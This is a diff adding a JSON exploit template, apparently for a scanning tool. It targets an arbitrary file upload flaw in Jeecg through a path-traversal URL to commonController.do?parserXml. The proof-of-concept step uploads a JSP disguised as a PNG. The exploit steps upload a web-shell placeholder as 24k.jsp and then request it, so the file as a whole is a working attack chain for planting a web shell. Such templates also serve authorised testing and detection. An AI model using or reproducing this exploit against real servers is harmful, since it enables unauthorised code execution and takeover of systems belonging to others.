@@ -1,0 +1,42 @@
+{
+	"name":"Jeecg任意文件上传",
+	"tag":"jee",
+	"type":"upload",
+	"poc":{
+		"pocGet":"/api/../commonController.do?parserXml",
+		"pocPost":"------WebKitFormBoundarygcflwtei\r\nContent-Disposition: form-data; \"name=\"name\"\r\n\r\nzW9YCa.png\r\n------WebKitFormBoundarygcflwtei\r\nontent-Disposition: form-data; name=\"documentTitle\"\r\n\r\nblank\r\n------WebKitFormBoundarygcflwtei\r\nContent-Disposition: form-data; name=\"file\"; filename=\"zW9YCa.jsp\"\r\nContent-Type: image/png\r\n\r\n<% out.println(\"HelloWorld\");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n------WebKitFormBoundarygcflwtei--",
+		"header":{
+			"User-Agent":" Mozilla/2.0 (compatible; MSIE 3.01; Windows 95",
+			"Connection":" close",
+			"Accept-Encoding":" gzip, deflate",
+			"Content-Length":" 463",
+			"Content-Type":" multipart/form-data; boundary=----WebKitFormBoundarygcflwtei"
+		},
+		"status_code":"200",
+		"pattern":"(:true)"
+	},
+	"exp":{
+		"step1":{
+			"expGet":"/api/../commonController.do?parserXml",
+			"expPost":"------WebKitFormBoundarygcflwtei\r\nContent-Disposition: form-data; \"name=\"name\"\r\n\r\n24k.png\r\n------WebKitFormBoundarygcflwtei\r\nontent-Disposition: form-data; name=\"documentTitle\"\r\n\r\nblank\r\n------WebKitFormBoundarygcflwtei\r\nContent-Disposition: form-data; name=\"file\"; filename=\"24k.jsp\"\r\nContent-Type: image/png\r\n\r\n{{webshell}}\r\n------WebKitFormBoundarygcflwtei--",
+			"header":{
+				"User-Agent":" Mozilla/2.0 (compatible; MSIE 3.01; Windows 95",
+				"Connection":" close",
+				"Accept-Encoding":" gzip, deflate",
+				"Content-Length":" 463",
+				"Content-Type":" multipart/form-data; boundary=----WebKitFormBoundarygcflwtei"
+			},
+			"status_code":"200",
+			"pattern":"(:true)"
+		},
+		"step2":{
+			"expGet":"/24k.jsp",
+			"header":{
+				"User-Agent":"Mozilla/5.0 (Linux;",
+				"content-type":"text/plain"
+			},
+			"status_code":"200",
+			"pattern":"()"
+		}
+	}
+}
